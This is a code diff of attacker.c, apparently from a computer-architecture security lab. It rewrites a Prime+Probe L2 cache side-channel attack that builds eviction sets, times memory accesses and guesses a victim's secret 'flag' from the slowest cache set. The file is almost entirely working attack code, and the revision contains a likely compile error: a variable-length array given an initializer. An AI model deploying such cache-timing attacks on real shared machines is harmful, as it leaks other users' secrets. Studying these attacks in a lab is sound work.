@@ -1,61 +1,60 @@
-// attacker.c
+/* attacker.c */
 
-#include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <unistd.h>
+#include "util.h"
 
-#define BUFF_SIZE (256 * 4096)  // 2MB Hugepage (256 * 4KB pages)
-#define NUM_SETS 2048           // Skylake server: 2K L2 sets
-#define PROBES_PER_SET 16       // Number of cache lines probed per set
-#define SAMPLES 5               // Number of repeated measurements
+#define NUM_TRIALS 100  // Number of times to repeat probing to get average latency
 
 int main() {
-    // Initialize huge pages and get buffer
-    hugepages_init();  // ✅ Allocate hugepage pool
-    uint8_t *buf = (uint8_t *) get_hugepage(0);  // ✅ Get a 2MB hugepage
-    if (buf == NULL) {
-        perror("Hugepage allocation failed");
-        return 1;
-    }
+    // Step 1: Allocate a large buffer (huge pages)
+    uint8_t *buffer = get_buffer(); // Provided by util.c
 
-    // Prepare eviction sets
-    uint8_t *sets[NUM_SETS][PROBES_PER_SET] = {0}; // Initialize array to NULL
+    // Step 2: Constants
+    const int num_sets = NUM_L2_CACHE_SETS;  // Provided by util.h
+    const int probe_ways = 8;  // Number of accesses per set (tune this)
 
-    // Fill eviction sets
-    for (int i = 0; i < BUFF_SIZE; i += 64) {  // Step 64 bytes = one cache line
-        uint64_t addr = (uint64_t)(buf + i);
-        int set = (addr >> 6) & 0x7FF;  // Extract bits [6:16) = 11 bits for L2 set
-        for (int j = 0; j < PROBES_PER_SET; j++) {
-            if (sets[set][j] == NULL) {
-                sets[set][j] = (uint8_t *) addr;
-                break;
-            }
+    // Step 3: Prepare eviction set per cache set
+    uint8_t *eviction_sets[num_sets][probe_ways];
+
+    for (int set = 0; set < num_sets; set++) {
+        for (int way = 0; way < probe_ways; way++) {
+            eviction_sets[set][way] = set_to_addr(buffer, set, way);
         }
     }
 
-    // Attack: probe all sets, measure access time
-    int best_set = -1;
-    uint64_t best_latency = 0xFFFFFFFFFFFFFFFF;  // Initialize to large number
+    // Step 4: Main Attack Loop
+    while (1) {
+        uint64_t set_latencies[num_sets] = {0};
 
-    for (int set_idx = 0; set_idx < NUM_SETS; set_idx++) {
-        if (sets[set_idx][PROBES_PER_SET-1] == NULL) continue; // Not enough entries
-
-        uint64_t total_time = 0;
-
-        for (int sample = 0; sample < SAMPLES; sample++) {
-            for (int probe = 0; probe < PROBES_PER_SET; probe++) {
-                total_time += measure_one_block_access_time((uint64_t)sets[set_idx][probe]);
+        // Probe each set
+        for (int trial = 0; trial < NUM_TRIALS; trial++) {
+            for (int set = 0; set < num_sets; set++) {
+                for (int way = 0; way < probe_ways; way++) {
+                    // Measure access time to each address
+                    set_latencies[set] += measure_one_block_access_time(eviction_sets[set][way]);
+                }
             }
         }
 
-        if (total_time < best_latency) {
-            best_latency = total_time;
-            best_set = set_idx;
+        // Step 5: Find the set with highest latency (victim set)
+        int guessed_flag = 0;
+        uint64_t max_latency = 0;
+
+        for (int set = 0; set < num_sets; set++) {
+            if (set_latencies[set] > max_latency) {
+                max_latency = set_latencies[set];
+                guessed_flag = set;
+            }
         }
+
+        printf("Guessed flag: %d\n", guessed_flag);
+
+        // Sleep before next guess to avoid spamming
+        sleep(1);
     }
 
-    // Output captured flag
-    printf("Captured flag: %d\n", best_set);
     return 0;
 }
